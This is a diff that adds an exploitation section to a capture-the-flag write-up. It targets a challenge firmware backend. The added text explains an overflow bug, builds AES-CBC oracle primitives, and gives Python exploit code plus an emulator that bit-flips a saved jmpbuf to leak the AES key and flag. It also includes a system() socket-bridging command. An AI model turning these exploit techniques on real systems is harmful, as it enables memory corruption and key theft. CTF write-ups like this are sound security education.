@@ -792,19 +792,23 @@ Luckily, some of the functionality of the front-end was included in the backend,
 The general structure of the backend is similar to the front-end. `main` looks like this:
 
 ```c
-uVar1 = create_server(1337);
-uVar2 = server_accept_conn(uVar1);
+int server_fd;
+int client_fd;
+int res;
+
+server_fd = create_server(0x539);
+client_fd = server_accept_conn(server_fd);
 random_nonces(paes_nonces);
-memset(exc,0,0x148);
-iVar3 = setjmp(&exc->jmpbuf);
-exc->exc_occurred = iVar3;
+memset(pexc,0,0x148);
+res = setjmp(&pexc->jmpbuf);
+pexc->exc_occurred = res;
 clear();
-if (exc->exc_occurred != 0) {
-  exc_report(exc->exc_message,uVar2);
+if (pexc->exc_occurred != 0) {
+  exc_report(pexc->exc_message,client_fd);
 }
-mainloop(uVar2);
-close(uVar2);
-close(uVar1);
+mainloop(client_fd);
+close(client_fd);
+close(server_fd);
 ```
 
 where `exc` is a global variable of the following structure:
@@ -814,7 +818,7 @@ struct exc_info {
     char *exc_message;
     int exc_occurred;
     jmp_buf jmpbuf;
-} *exc;
+} *pexc;
 ```
 
 Again, it creates a server, listens for a connection, and uses `setjmp` for exception handling. However, instead of providing a textual menu, `mainloop` instead reads a single `comm_pkt`, and then conditions on the `cmd` field. Several commands are defined:
@@ -858,11 +862,412 @@ Note that the real `strncpy` has the arguments in a different order (`dst`, `src
 
 Instead, I found a different bug. The add function (at 0x1340) checks that the size is valid before adding a message, but only for the size field corresponding to the `mode` of the message. So, it checks `size_mode0` if `mode = 0`, and `size_mode1` if `mode = 1`. However, the encrypt (0x1718) and decrypt (0x1830) functions will directly use `size_mode0` and `size_mode1` respectively without checking the mode of the message. Thus, by sending a message with an out-of-bounds `size_mode0` and `mode = 1`, we can cause an overflow in `encrypt`, and vice-versa for `decrypt`.
 
-Unfortunately, exploiting this bug is far more complicated than exploiting a format-string vulnerability.
+`encrypt` and `decrypt` look like this:
 
-### Exploiting AES-CBC to Flip Bits
+```c
+int encrypt(int fd) {
+  int ret;
+  uint size;
+  uint i;
+  msg *msg;
+  
+  if (*p_msg_count == 0) {
+    ret = 0;
+  }
+  else {
+    i = 0;
+    while( true ) {
+      if (*p_msg_count <= i) break;
+      msg = p_msgs + i;
+      size = do_encrypt(aes_key,paes_nonces + (ulong)i * 0x10,msg->data,msg->size_mode0);
+      msg->size_mode1 = size;
+      msg->mode = 1;
+      rpkt->resp = 1;
+      memcpy(&rpkt->payload,msg,0x114);
+      reply_msg(fd);
+      i += 1;
+    }
+    clear();
+    ret = 1;
+  }
+  return ret;
+}
 
-Encryption and decryption are done using AES-256 in CBC mode, using 10 random nonces (one per `msg`, derived from `/dev/urandom`). C's private key is used as the AES key. Both encryption and decryption follow the same structure: the function loops over each message (up to `msg_count`) and encrypts or decrypts the message body up to `size_mode0` (encrypt) or `size_mode1` (decrypt). Neither encryption nor decryption use any padding. After processing a message, the result is sent back in a packet. After processing all messages, the message array is cleared by setting `msg_count = 0` and zeroing out all ten `msg`s.
+int decrypt(int fd) {
+  int ret;
+  uint i;
+  msg *msg;
+  byte *nonce;
+  
+  if (*p_msg_count == 0) {
+    ret = 0;
+  }
+  else {
+    i = 0;
+    while( true ) {
+      if (*p_msg_count <= i) break;
+      msg = p_msgs + i;
+      nonce = paes_nonces + (ulong)i * 0x10;
+      msg->mode = 0;
+      ret = do_decrypt(aes_key,nonce,msg->data,msg->size_mode1);
+      msg->size_mode0 = ret;
+      rpkt->resp = 1;
+      memcpy(&rpkt->payload,msg,0x114);
+      reply_msg(fd);
+      i += 1;
+    }
+    clear();
+    ret = 1;
+  }
+  return ret;
+}
+```
+
+Unfortunately, exploiting these two overflow bugs is far more complicated than exploiting a format-string vulnerability.
+
+### Exploitation Explorations
+
+In order to exploit the backend server more efficiently, I chose to use the `system()` ROP call to execute the command `cat <&4 >&5 & cat <&5 >&4; echo 'EOF!EOF!' >&5`. This command creates a simple bidirectional connection between the client socket and the backend socket; after executing this command, we will effectively bypass the frontend entirely and communicate directly with the backend.
+
+Encryption and decryption are done using AES-256 in CBC mode, using 10 random nonces (one per `msg`, derived from `/dev/urandom`). Charly's private key is used as the AES key. Both encryption and decryption follow the same structure: the function loops over each message (up to `msg_count`) and encrypts or decrypts the message body up to `size_mode0` (encrypt) or `size_mode1` (decrypt). Neither encryption nor decryption use any padding. After processing a message, the result is sent back in a packet. After processing all messages, the message array is cleared by setting `msg_count = 0` and zeroing out all ten `msg`s. One particular feature is that the `msg_count` immediately follows the ten `msg`s in memory, and thus it will be the first thing that is overwritten when overflowing the `msg` array.
+
+Unlike the front-end, there is no bug that will allow us to add extra messages. Thus, when exploiting the overflow in `encrypt`/`decrypt`, we cannot control the content of the data after the ten messages, except to encrypt or decrypt entire blocks (with an unknown key). While we can overwrite the `msg_count` during the overflow, it does not help us add more messages, as the count is cleared after all the messages are processed. Furthermore, although we can overwrite `msg_count` to cause `encrypt` and `decrypt` to process more messages, both functions set `msg->mode`; on `msgs[10]` (the first out-of-bound message), `msgs[10].mode` coincides with `msg_count`, meaning that both functions will set the low byte of `msg_count` to 0 or 1. This will terminate the loop early if `msg_count < 256`, and if `msg_count >= 256`, the loop will run off the end of the BSS area and crash in unmapped memory. So, we cannot work with any message past `msgs[10]`, and in particular, we have no way to leak memory past `msgs[10]`.
+
+Because we do not control the content of `msgs[10]` directly, it's very hard to work with. Thus, we will generally restrict ourselves to using `msgs[9]` with a large size parameter to trigger the overflow.
+
+First, it's helpful to define a few primitive operations that we can perform by using arbitrary AES-CBC operations with an unknown key and nonce. Here's how AES-CBC works pictorially, courtesy Wikipedia:
+
+> [![Figure showing the process of CBC encryption](images/CBC_encryption.png)](https://commons.wikimedia.org/wiki/File:CBC_encryption.svg)
+
+> [![Figure showing the process of CBC decryption](images/CBC_decryption.png)](https://commons.wikimedia.org/wiki/File:CBC_decryption.svg)
+
+For ease of notation, define the following:
+- $||$: concatenation
+- $\oplus$: XOR
+- $0^{16}$: a zero block
+- $e(C)$: the raw encryption operation (with the unknown-but-fixed AES key)
+- $d(M)$: the raw decryption operation
+- $E_{IV}(M)$: the CBC encryption operation ($IV$ may be omitted if it is unimportant)
+- $D_{IV}(C)$: the CBC decryption operation
+
+such that we have $E_{IV}(M) = e(IV \oplus M)$ for a single block $M$, and similarly $D_{IV}(C) = d(C) \oplus IV$ for a single block $C$.
+
+We can do the following:
+
+1. We can compute $d(C)$ for an arbitrary $C$ by requesting $D_{IV}(0^{16} || C)$ and taking the second block, since the second block will be equal to $d(C) \oplus 0^{16}$.
+2. We can recover the IV by requesting $D_{IV}(0^{16} || 0^{16})$, since the two zero blocks will be decrypted to the same raw "plaintext", but the first block will be XORed with $IV$ and the second will be XORed with $0^{16}$.
+3. During decryption, if we control a block $X$ before a known (but uncontrolled) block $Y$, we can transform $Y$ into a chosen block $Z$ by choosing $X = d(Y) \oplus Z$; this will cause the second block of $D(X||Y)$ to be $Z$.
+4. During *encryption*, if we control *everything* before a known (but uncontrolled) block $Y$, we can transform $Y$ into a chosen block $Z$ as follows:
+    - Obtain $Z_p = d(Z)$.
+    - Let $n$ be the number of blocks before $Y$. Choose $n$ blocks $X_1, X_2, ..., X_n$.
+    - Request $E_{IV}(X_1 || X_2 || ... || X_n)$, obtaining $C_1, C_2, ..., C_n$.
+    - Set $C'_n = Y \oplus Z_p$ and obtain $X'_n = d(C'_n) \oplus C_{n-1}$.
+    - The "plaintext" will be $X_1 || X_2 || ... || X_{n-1} || X'_n || Y$; when encrypted, the last block will become $Z$.
+
+Using (3) and (4), we can reliably control the `msg_count` right after `msg[9]`, and also control the size of `msgs[10]`:
+
+> [![Figure showing the memory layout of `msgs[9]` and the subsequent `msg_count` block](images/2c_1_mem_9.png)](images/2c_1_mem_9.png)
+
+We'll define some helper functions to make this easier ([`fwexploit_base.py`](files/stage2c/fwexploit_base.py)):
+
+```python
+from exploit2 import *
+
+exploit_system("cat <&4 >&5 & cat <&5 >&4; echo 'EOF!EOF!' >&5")
+
+from typing import Optional
+from zlib import crc32
+from dataclasses import dataclass
+
+RESPONSE = 0x1336
+ADD_MSG = 0x1337
+ENCRYPT = 0x1338
+DECRYPT = 0x1339
+
+@dataclass
+class Message:
+    mode: int = 0
+    size_mode0: Optional[int] = None
+    id: int = 0
+    data: bytes = b""
+    crc: Optional[int] = None
+    size_mode1: Optional[int] = None
+
+    def to_bytes(self):
+        if self.crc is None:
+            self.crc = crc32(self.data) & 0xffffffff
+        if self.size_mode0 is None:
+            self.size_mode0 = len(self.data)
+        if self.size_mode1 is None:
+            self.size_mode1 = len(self.data)
+        return struct.pack("<III256sII",
+            self.mode, self.size_mode0, self.id, self.data, self.crc, self.size_mode1)
+
+    @classmethod
+    def from_bytes(cls, data):
+        res = cls(*struct.unpack("<III256sII", data))
+        res.data = res.data.rstrip(b"\0")
+        return res
+
+def xor(a, b):
+    return bytes([ca^cb for ca,cb in zip(a,b)])
+
+def write_pkt(cmd, msg=None, resp=0):
+    s.send(p32(resp) + p32(cmd) + (msg.to_bytes() if msg else b"\0" * 0x114))
+
+def read_responses(progress=False):
+    resps = []
+    while 1:
+        if progress:
+            log.info("reading responses... %d", len(resps))
+        resp = s.recvn(8)
+        if resp == b"EOF!EOF!":
+            raise EOFError()
+        resp, cmd = u32(resp[:4]), u32(resp[4:])
+        msg = Message.from_bytes(s.recvn(0x114))
+        if cmd == RESPONSE:
+            break
+        resps.append(msg)
+    return resp, resps
+
+def add(msg):
+    write_pkt(ADD_MSG, msg=msg)
+
+def encrypt(n):
+    write_pkt(ENCRYPT)
+    for i in range(n):
+        resp, data = read_responses()
+        assert resp == 1
+    resp, data = read_responses()
+    assert resp == 1
+    return data
+
+def decrypt(n):
+    write_pkt(DECRYPT)
+    for i in range(n):
+        resp, data = read_responses()
+        assert resp == 1
+    resp, data = read_responses()
+    assert resp == 1
+    return data
+
+def decrypt_block(block):
+    add(Message(mode=1, data=b"\0" * 16 + block))
+    data = decrypt(1)
+    return data[-1].data.ljust(32, b"\0")[16:32]
+```
+
+Now that we can control `msg_count`, we can progressively increase the size of the overflow in order to corrupt the memory beyond `msgs`. We can check the IVs using technique (2) above to see where the IV array is, and we can check to see if our `jmpbuf` is still intact by triggering an exception and watching for a crash. By doing this ([`fwexploit1_memtest.py`](files/stage2c/fwexploit1_memtest.py)), we can infer the following memory layout:
+
+```c
+0x16048  msg  msgs[10]
+0x16b10  uint num_msgs
+0x16b14  byte unused[0x114]
+0x16c28  byte ivs[16][10]
+0x16cc8  exc_info exc
+    0x16cd8  jmp_buf exc.jmpbuf
+        0x16d30 uint64_t exc.jmpbuf.x30
+        0x16d40 uint64_t exc.jmpbuf.sp
+```
+
+### Flipping Bits with AES-CBC
+
+Our goal is to gain control over the `jmpbuf`. While techniques (3) and (4) are helpful for mutating one known block into another, they aren't useful for mutating *unknown* blocks, and in any case we do not directly control the block preceding the `jmpbuf`. We'll turn to another trick: *iterated* AES-CBC bit-flipping.
+
+Classic AES-CBC bit-flipping works as follows: if we have an encrypted two-block message $E_{IV}(M_1 || M_2) = C_1 || C_2$ and access to a decryption oracle $D$, then we can selectively flip bits in $M_2$ by XORing the desired difference $\Delta$ into $C_1$: $D_{IV}(C_1 \oplus \Delta || C_2) = d(C_1 \oplus \Delta) \oplus IV || M_2 \oplus \Delta$ (where $M_2 = d(C_2) \oplus C_1$). The first block effectively becomes garbage, but the second block is precisely XORed with the desired difference.
+
+The block that we want to bit-flip is the one containing `x30`. However, that block is too far away: there are several blocks in between `msgs[9]` and `jmpbuf.x30` that we do not control.
+
+Because we can call `encrypt` and `decrypt` in any order, and with any (overflowed) length, we can perform *iterated* AES-CBC bit-flipping. The basic AES-CBC bit-flip allows us to bit-flip one block by bit-flipping the previous block. We can bit-flip that previous block by bit-flipping the block before that one, and so on, until we reach a block that we can manipulate directly. Diagrammatically:
+
+> [![Figure showing the iterated bit-flip process](images/2c_2_bitflip.png)](images/2c_2_bitflip.png)
+
+For simplicity, the diagram simply shows a single $E$ function. However, the action of $E$ actually depends on the previous encrypted block (or IV): $E(Y_n) = e(Y_n \oplus E(Y_{n-1}))$.
+
+### Bit-Flipping `msg_count`
+
+Unfortunately, attempting to apply the iterated AES-CBC bit-flipping approach runs into a particular alignment issue: `x30` is at 0x16d30, while `num_msgs` is at 0x16b10. They are at the same position in each block, so an XOR difference applied to the low 32 bits of `x30` has to correspond with an XOR difference in `num_msgs`. If we need to flip any bits outside of the low byte of `num_msgs`, this implies setting the second byte of `num_msgs`, which will make it greater than 255 and crash our program. Unfortunately, all of the one-byte differences applied to `x30` (0x1e94 in the binary) result in addresses that are not useful for exploitation, so we will have to use a two-byte difference.
+
+To solve this, I employed a two-stage approach to bit-flip the block after `num_msgs`. Instead of overflowing from `msgs[9]`, I overflowed from `msgs[1]` and `msgs[5]` (so chosen because they have the same 16-byte alignment as `msgs[9]`). The `msgs[1]` overflow bit-flips the `num_msgs` block, temporarily increasing `msg_count`. The `msgs[5]` overflow applies that bit-flip to the block after `msg_count`, simultaneously changing `msg_count` to be zero and terminating the decryption operation. Diagrammatically:
+
+> [![Figure showing the process of bit-flipping the block after msg_count](images/2c_3_munge.png)](images/2c_3_munge.png)
+
+When decrypting everything from `msgs[1]` to the `msg_count`, we will "decrypt" all of the intervening blocks, including the size fields for every subsequent message, so the data payloads for `msgs[2]` through `msgs[5]` must be chosen carefully so that their size fields will still be correct after decryption.
+
+We also have to choose $X$ and $Y$ carefully so that the desired result will appear in the `msg_count` block. Let $M$ be the original `msg_count` block; then we have:
+
+- $Y = d(M) \oplus M \oplus \Delta$
+- $D(Y) = d(Y) \oplus X = d(M \oplus \Delta) \oplus 0^{16}$
+- $X = d(Y) \oplus d(M \oplus \Delta)$
+
+Developing this attack was quite complex. Since I could not run `firmware.bin` locally, I resorted to constructing an *emulator* ([`aes_test.py`](files/stage2c/aes-test.py)) in Python that emulated the operation of `encrypt` and `decrypt`, but provided me with access to all of the (virtual) memory. The core of the emulator looks like this:
+
+```python
+SECRET_AES_KEY = os.urandom(32)
+
+MEMORY = bytearray(0x1000)
+MEMORY[0xd30:0xd38] = p64(0xdeadbeeffeed1e94) # x30
+MEMORY[0xd40:0xd48] = p64(0xf00fb00bd00d13b0) # sp
+MEMORY[0xc28:0xcc8] = os.urandom(16*10) # nonces
+
+def clear():
+    MEMORY[0x48:0x48 + 0xac8 + 4] = b"\0" * (0xac8 + 4)
+
+def add(m):
+    n = u32(MEMORY[0xb10:0xb14])
+    MEMORY[0x48 + n * 0x114:0x48 + (n+1)*0x114] = m.to_bytes()
+    MEMORY[0xb10:0xb14] = p32(n + 1)
+
+def encrypt(n):
+    i = 0
+    results = []
+    while 1:
+        n = u32(MEMORY[0xb10:0xb14])
+        if i >= n: break
+        base = 0x48 + i * 0x114
+        m = Message.from_bytes(MEMORY[base: base + 0x114])
+        iv = MEMORY[0xc28 + i * 0x10: 0xc28 + (i+1) * 0x10]
+        sz = m.size_mode0
+        print("...encrypt %d/%d [%d bytes]" % (i, n, sz))
+        assert base + 0xc + sz <= 0x1000
+        MEMORY[base + 0xc:base + 0xc + sz] = AES.new(SECRET_AES_KEY, mode=AES.MODE_CBC, iv=iv).encrypt(MEMORY[base + 0xc:base + 0xc + sz])
+        MEMORY[base + 0x110:base + 0x114] = p32(sz)
+        MEMORY[base] = 1
+        i += 1
+        results.append(Message.from_bytes(MEMORY[base:base+0x114]))
+    clear()
+    return results
+
+def decrypt(n):
+    i = 0
+    results = []
+    while 1:
+        n = u32(MEMORY[0xb10:0xb14])
+        if i >= n: break
+        base = 0x48 + i * 0x114
+        m = Message.from_bytes(MEMORY[base: base + 0x114])
+        iv = MEMORY[0xc28 + i * 0x10: 0xc28 + (i+1) * 0x10]
+        sz = m.size_mode1
+        print("...decrypt %d/%d [%d bytes]" % (i, n, sz))
+        assert base + 0xc + sz <= 0x1000
+        MEMORY[base] = 0
+        MEMORY[base + 0xc:base + 0xc + sz] = AES.new(SECRET_AES_KEY, mode=AES.MODE_CBC, iv=iv).decrypt(MEMORY[base + 0xc:base + 0xc + sz])
+        MEMORY[base + 4:base + 8] = p32(sz)
+        i += 1
+        results.append(Message.from_bytes(MEMORY[base:base+0x114]))
+    clear()
+    return results
+```
+
+This enabled me to build an initial exploit which would flip the bits of `x30` to cause `longjmp` to return elsewhere:
+
+```python
+CRC = crc32(b"A" * 16)
+
+def decrypt_msg9(size):
+    """ Overflowing decryption from message 9. Uses (CRC, size, 10, 0) as the IV for overflowed blocks. """
+    block_old = struct.pack("<IIII", CRC, size, 10, 0)
+    block_new = struct.pack("<IIII", 0xaaaaaaaa, 0xbbbbbbbb, 0, 0)
+    block_dec = decrypt_block(block_old)
+    block_enc = xor(block_new, block_dec)
+
+    for i in range(9):
+        add(Message(mode=0, data=b"A" * 16))
+    add(Message(mode=0, data=b"A" * 240 + block_enc, size_mode0=16, size_mode1=size, crc=CRC))
+    decrypt(10)
+
+def encrypt_msg9(size, size1):
+    """ Overflowing encryption from message 9. Uses (CRC, size1, 10, 0) as the IV for overflowed blocks. """
+    block_old = struct.pack("<IIII", CRC, 16, 10, 0)
+    block_new = struct.pack("<IIII", CRC, size1, 10, 0)
+    block_dec = decrypt_block(block_new)
+    prev_block_enc = xor(block_old, block_dec)
+    prev_block_dec = decrypt_block(prev_block_enc)
+
+    for i in range(9):
+        add(Message(mode=0, data=b"A" * 16))
+    add(Message(mode=0, data=b"A" * 256))
+    data = encrypt(10)
+
+    prev_block_pt = xor(data[-1].data[224:240], prev_block_dec)
+
+    for i in range(9):
+        add(Message(mode=0, data=b"A" * 16))
+    add(Message(mode=1, size_mode0=size, data=b"A" * 240 + prev_block_pt, size_mode1=16, crc=CRC))
+    encrypt(10)
+
+def munge_272(diff):
+    block_old = struct.pack("<IIII", CRC, 16, 10, 0)
+    block_dec = decrypt_block(block_old)
+    block_new = struct.pack("<IIII", CRC, 288, diff ^ 10, 0)
+    block_enc = xor(block_new, block_dec)
+    b2_old = struct.pack("<IIII", 0, CRC, 16, 0)
+    b2_dec = decrypt_block(b2_old)
+    b2_enc = xor(b2_old, b2_dec)
+    b3_old = struct.pack("<IIII", 0, 0, CRC, 16)
+    b3_dec = decrypt_block(b3_old)
+    b3_enc = xor(b3_old, b3_dec)
+    b4_old = struct.pack("<IIII", 16, 0, 16, 0)
+    b4_dec = decrypt_block(b4_old)
+    b4_enc = xor(b4_dec, b4_old)
+    b5_old = struct.pack("<IIII", CRC, 0x114 * 5 + 12, 0, 16)
+    b5_dec = decrypt_block(b5_old)
+    b5_enc = xor(b5_dec, b5_old)
+    b9_want = struct.pack("<IIII", 0, 0, 0, 0)
+    b9_dec1 = decrypt_block(block_enc)
+    b9_dec2 = decrypt_block(block_new)
+    b9_enc = xor(b9_want, xor(b9_dec1, b9_dec2))
+
+    add(Message(mode=0, data=b"A" * 16))
+    add(Message(mode=0, data=b"A" * 16, size_mode1=0x114 * 9 - 4, crc=CRC))
+    add(Message(mode=0, data=b"A" * 16 + b"X" * 220 + b2_enc, size_mode0=16, size_mode1=16, crc=CRC))
+    add(Message(mode=0, data=b"A" * 16 + b"X" * 216 + b3_enc, size_mode0=16, size_mode1=16, crc=CRC))
+    add(Message(mode=0, data=b"A" * 16 + b"X" * 228 + b4_enc[:12], size_mode0=16, size_mode1=16, crc=CRC))
+    add(Message(mode=0, data=b"A" * 240 + b5_enc, size_mode0=16, size_mode1=0x114 * 5 + 12, crc=CRC))
+    add(Message(mode=0, data=b"A" * 16))
+    add(Message(mode=0, data=b"A" * 16))
+    add(Message(mode=0, data=b"A" * 16))
+    add(Message(mode=0, data=b"A" * 16 + b"\0" * 208 + b9_enc + block_enc, size_mode0=16, size_mode1=16, crc=CRC))
+    decrypt(10)
+
+cur_x30 = 0x1e94
+new_x30 = 0x1b78
+
+SCHEDULE = list(range(816, 272, -16))
+for L in tqdm(SCHEDULE):
+    encrypt_msg9(L, L)
+
+munge_272(new_x30 ^ cur_x30)
+
+for L in tqdm(SCHEDULE[::-1][1:]):
+    decrypt_msg9(L)
+```
+
+This works! I tried various values of `x30` to see if they will produce anything interesting. 0x1b78, for example, is in the middle of the firmware reading code, and will dump out 256 bytes of the stack. However, there's nothing interesting there, as the stack frame it prints out is `main` (we get some ASLR leaks, but those are not useful to us). 0x1218 is in the middle of the password check, but it also does not work since the `main` stack frame is missing variables that the password check expects to see.
+
+So, we will have to modify `sp` as well in order to move to a different stack frame. Unfortunately, `sp` is in the block right *after* `x30`: if we bit-flip `sp`, `x30` will become garbage!
+
+### Final Exploit
+
+What we actually need to do is execute the bit-flip attack *three times*: the first time to flip `sp`, the second time to un-flip everything before `sp` (restoring the "garbage" back to the original values), and the third time to flip `x30`. This gets kind of complicated, but luckily it's easy enough to develop and debug the attack using my emulator ([`aes_test.py`](files/stage2c/aes-test.py)).
+
+We have to find a suitable target location to jump to, as well as a suitable stack adjustment to apply. ROP is not an option because we do not have any viable ASLR leak (all of our leaks entail crashing the program). We control very little of the stack: the 0x133e check password function (at 0x1150) reads 32 bytes of the input onto the stack with `strncpy?`, but this is overwritten by `longjmp`.
+
+Note that XORing the stack pointer with a constant bit-flip mask doesn't necessarily produce a constant stack shift, as the stack pointer is randomized with a granularity of 16 bytes. So, we will have to run the exploit repeatedly and get lucky.
+
+In the end, I found a nice solution: the AES decryption routine at 0x1574 places the AES round keys on the stack, then calls the AES-CBC decryption routine at 0x4480. The CBC decryption routine copies the most recent ciphertext block (which we control) to the stack, giving us 16 bytes of stack control. We can use that 16 bytes to set up a fake stack frame for the firmware reading routine (just enough to put the client fd on the stack), and then use the firmware read at 0x1b78 to dump out the contents of the stack - including the AES round keys. Since the first 16 bytes of the round key structure is the original AES key, this gives us the private key for the win.
+
+Putting it all together, we have the following attack:
+
+1. Exploit the front-end and execute `cat <&4 >&5 & cat <&5 >&4` to connect the client socket directly to the backend.
+2. Use iterated AES-CBC bit-flipping to XOR the stack pointer in the `jmpbuf` with 0x1e0, which has a chance of decreasing the stack pointer by 0x1e0.
+3. Use iterated AES-CBC bit-flipping to restore the value of `x30` which was corrupted in the previous step.
+4. Use iterated AES-CBC bit-flipping to flip the value of `x30` from `(exe + 0x1e94) ^ guard` to `(exe + 0x1b78) ^ guard`.
+5. Call `decrypt` with a block containing the client fd (4) to establish a fake stack frame.
+6. Send an invalid packet to throw an exception, calling `longjmp`.
+7. If everything lines up, stack contents will be printed, including the AES key and round keys.
+
+This exploit is implemented in [`fwexploit2_real.py`](files/stage2c/fwexploit2_real.py). It takes several tries to land (~5-10, experimentally), but it does eventually dump the stack and the AES key ([`aes_leak.bin`](files/stage2c/aes-leak.bin)), from which we can read off the AES key: `04 C6 CB 31 E7 F3 BA 69 4C C0 1F 50 D6 57 3F 8D 22 BE 2E 1B D7 86 1E 17 6D 5B 4E D4 3C 13 F9 F9`. We can use this key to decrypt the stage 2c flag: `SSTIC{ba75fa41a81c43c1095588250d45af850cfcec187ae269f2389829224ae6060b}`. Phew!
 
 ## Stage 2.d
 
